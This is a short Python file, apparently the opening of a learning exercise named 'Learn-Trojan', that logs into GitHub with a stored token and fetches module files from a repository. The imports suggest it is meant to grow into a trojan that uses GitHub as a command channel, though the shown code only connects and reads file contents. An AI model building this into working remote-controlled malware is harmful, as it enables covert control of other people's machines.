import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

#function to connect to github
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
        user = 'ericardiansa'
        sess = github3.login(token=token)
        return sess.repositories(user, 'Learn-Trojan')
#function to get file contents from repositories
def get_file_contents(dirname,module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content